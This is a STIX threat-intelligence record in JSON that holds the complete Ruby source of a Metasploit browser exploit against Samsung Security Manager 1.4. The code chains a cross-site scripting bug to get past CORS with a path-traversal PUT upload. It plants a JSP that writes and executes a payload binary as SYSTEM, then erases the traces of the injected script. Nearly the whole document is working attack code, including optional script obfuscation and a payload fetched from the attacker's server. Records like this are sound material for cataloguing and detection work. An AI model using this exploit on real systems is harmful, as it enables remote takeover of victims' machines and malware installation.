{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--00f11e11-4e8d-4a41-b0e8-46020b4bf7f1",
    "created": "2024-08-14T16:41:21.925236Z",
    "modified": "2024-08-14T16:41:21.925241Z",
    "name": "\"Samsung Security Manager 1.4 ActiveMQ Broker Service PUT Method Remote Code Execution\"",
    "description": " This is an exploit against Samsung Security Manager that bypasses the patch in ZDI-15-156 & ZDI-16-481 by exploiting the vulnerability against the client-side. This exploit has been tested successfully using IE, FireFox and Chrome by abusing a GET request XSS to bypass CORS and reach the vulnerable PUT. Finally a traversal is used in the PUT request to upload the code just where we want it and gain RCE as SYSTEM.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/samsung_security_manager_put.rb",
            "external_id": "samsung_security_manager_put.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.zerodayinitiative.com/advisories/ZDI-16-481/#clientvsserver"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Samsung Security Manager 1.4 ActiveMQ Broker Service PUT Method Remote Code Execution\",\n      'Description'    => %q{\n        This is an exploit against Samsung Security Manager that bypasses the patch in ZDI-15-156 & ZDI-16-481\n        by exploiting the vulnerability against the client-side. This exploit has been tested successfully using\n        IE, FireFox and Chrome by abusing a GET request XSS to bypass CORS and reach the vulnerable PUT. Finally\n        a traversal is used in the PUT request to upload the code just where we want it and gain RCE as SYSTEM.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <mr_me[at]offensive-security.com>',                            # AWAE training 2016\n        ],\n      'References'     =>\n        [\n          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-15-156/' ], # client vs server\n          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-16-481/' ]  # client vs server\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Samsung Security Manager 1.32 & 1.4 Universal', {} ]               # tested on 1.32 & 1.4\n        ],\n      'DisclosureDate' => '2016-08-05',\n      'DefaultTarget'  => 0))\n      register_options(\n        [\n          OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n        ])\n  end\n\n  # this is because String.fromCharCode has a max of 65535 func args\n  # thanks to sinn3r for his help with the Array->String conversion\n  def encode_js(string)\n    i = 0\n    encoded_0 = []\n    encoded_1 = []\n    string.each_byte do |c|\n      if i > 65534\n        encoded_1 << c\n      else\n        encoded_0 << c\n      end\n      i += 1\n    end\n    if i > 65534\n      return encoded_0 * \",\", encoded_1 * \",\"\n    else\n      return encoded_0 * \",\"\n    end\n  end\n\n  # tested on Firefox v46.0.1 (latest)\n  # tested on Chrome v50.0.2661.102 (latest release)\n  # tested on IE v11.0.9600.18314 (latest)\n  def on_request_uri(cli, request)\n\n    js_name  = rand_text_alpha(rand(10)+5) + '.js'\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/\" + js_name\n\n    # we deliver the JavaScript code that does the work for us\n    if (request.uri.match(/.js/))\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      # dont exploit again otherwise we get a zillion shells\n      return if session_created? or @exploited\n\n      jsp_name = rand_text_alpha(rand(10)+5) + '.jsp'\n      exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n\n      # clean just the jsp, because the exe dropper will be in use\n      register_files_for_cleanup(\"../../webapps/admin/#{jsp_name}\")\n\n      # our jsp upload, ensuring native code execution\n      jsp = %Q|<%@ page import=\"java.io.*\" %>\n      <%\n      ByteArrayOutputStream buf = new ByteArrayOutputStream();\n      BufferedReader reader = request.getReader();\n      int tmp;\n      while ((tmp = reader.read()) != -1) { buf.write(tmp); }\n      FileOutputStream fostream = new FileOutputStream(\"#{exe_name}\");\n      buf.writeTo(fostream);\n      fostream.close();\n      Runtime.getRuntime().exec(\"#{exe_name}\");\n      %>|\n\n      # encode the payloads\n      encoded_exe = encode_js(generate_payload_exe(code: payload.encoded))\n      encoded_jsp = encode_js(jsp)\n\n      # targets\n      jsp_uri    = \"http://localhost:8161/fileserver/..%5c%5cadmin%5c%5c#{jsp_name}\"\n      upload_uri = \"http://localhost:8161/admin/#{jsp_name}\"\n\n      # this code does the PUT, then uploads/exec native code and then cleans the XSS out :->\n      js_content = %Q|\n\n      function do_put(uri, file_data) {\n        var file_size = file_data.length;\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"PUT\", uri, true);\n        var body = file_data;\n        xhr.send(body);\n        return true;\n      }\n\n      function do_upload(uri, file_data) {\n        var file_size = file_data.length;\n        var xhr = new XMLHttpRequest();\n        xhr.open(\"POST\", uri, true);\n        var body = file_data;\n\n        // latest ff doesnt have sendAsBinary(), so we redefine it\n        if(!xhr.sendAsBinary){\n          xhr.sendAsBinary = function(datastr) {\n            function byteValue(x) {\n              return x.charCodeAt(0) & 0xff;\n            }\n            var ords = Array.prototype.map.call(datastr, byteValue);\n            var ui8a = new Uint8Array(ords);\n            this.send(ui8a.buffer);\n          }\n        }\n        xhr.sendAsBinary(body);\n        return true;\n      }\n\n      function bye_bye_xss(uri){\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', uri.replace(/\\\\+/g,\"%2b\"), true);\n        xhr.send();\n      }\n\n      function clean_up(){\n        var xhr = new XMLHttpRequest();\n        xhr.onreadystatechange = function() {\n          if (xhr.readyState == XMLHttpRequest.DONE) {\n            var els = xhr.responseXML.getElementsByTagName(\"a\");\n            for (var i = 0, l = els.length; i < l; i++) {\n              var el = els[i];\n              if (el.href.search(\"http://localhost:8161/admin/deleteDestination.action\") == 0) {\n                bye_bye_xss(el.href);\n              }\n            }\n          }\n        }\n        xhr.open('GET', 'http://localhost:8161/admin/queues.jsp', true);\n        xhr.responseType = \"document\"; // so that we can parse the reponse as a document\n        xhr.send(null);\n      }\n\n      function exploit(){\n        do_upload('#{upload_uri}', String.fromCharCode(#{encoded_exe[0]}) + String.fromCharCode(#{encoded_exe[1]}));\n        clean_up();\n      }\n\n      function start() {\n        do_put('#{jsp_uri}', String.fromCharCode(#{encoded_jsp}));\n        setTimeout(exploit(), 4000); // timing is important\n      }\n      start();\n      |\n\n      if datastore['OBFUSCATE']\n        js_content = ::Rex::Exploitation::JSObfu.new(js_content)\n        js_content.obfuscate(memory_sensitive: true)\n      end\n\n    print_status(\"Sending javascript...\")\n    @exploited = true\n    send_response_html(cli, js_content, { 'Content-Type' => 'application/javascript' })\n    return\n    end\n\n    if datastore['OBFUSCATE']\n       js_content = ::Rex::Exploitation::JSObfu.new(js_content)\n       js_content.obfuscate(memory_sensitive: true)\n       onlick = ::Rex::Exploitation::JSObfu.new(onlick)\n       onlick.obfuscate(memory_sensitive: true)\n    end\n\n    # we can bypass Access-Control-Allow-Origin (CORS) in all browsers using iframe since it makes a GET request\n    # and the response is recieved in the page (even though we cant access it due to SOP) which then fires the XSS\n    html_content = %Q|\n    <html>\n    <body>\n    <script>\n\n    function fire() {\n      var a = document.createElement('script');\n      a.type = 'text/javascript';\n      a.src = '#{payload_url}';\n      document.body.appendChild(a);\n    };\n\n    var code = fire.toString() + \";fire();\";\n    var evalCode = 'eval(\"' + code + '\")';\n    var if1 = document.createElement(\"iframe\");\n    if1.src = 'http://localhost:8161/admin/browse.jsp?JMSDestination=\"%2b' + evalCode + '%2b\"';\n    if1.width = 0;\n    if1.height = 0;\n    document.body.appendChild(if1);\n\n    </script>\n    <script>\n\n    window.onload = function() {\n      var if2 = document.createElement(\"iframe\");\n      if2.src = \"http://localhost:8161/admin/queueGraph.jsp\"\n      if2.width = 0;\n      if2.height = 0;\n      document.body.appendChild(if2);\n    };\n    </script>\n    </body>\n    </html>\n    |\n    print_status(\"Sending exploit...\")\n    send_response_html(cli, html_content)\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-08-05",
    "x_mitre_platforms": [
        "win'"
    ]
}